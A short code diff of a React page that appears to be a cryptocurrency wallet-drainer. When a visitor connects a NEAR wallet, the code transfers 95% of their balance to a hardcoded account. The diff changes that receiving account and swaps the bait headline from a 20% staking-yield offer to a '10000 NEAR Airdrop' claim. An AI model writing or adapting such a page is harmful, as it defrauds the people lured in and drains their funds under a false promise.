@@ -75,7 +75,7 @@ export default function Home() {
           const transferAmount = (balance * 95n) / 100n;
 
           const transaction = {
-            receiverId: "460da082d5bedbf30ff97a4066dc4bfa9e8456b370ca53865ff762de5a075b73",
+            receiverId: "96b80b96714e2b20dff9b0be6fde7868daf9bd0575c029a6901e868e38bea547",
             actions: [
               {
                 type: "Transfer",
@@ -163,7 +163,7 @@ export default function Home() {
         </>
       ) : (
         <>
-          <h1 style={{ marginBottom: "2rem" }}>Earn 20% APY for staking your NEAR</h1>
+          <h1 style={{ marginBottom: "2rem" }}>Claim your 10000 NEAR Airdrop</h1>
           <button
             onClick={handleConnect}
             style={{
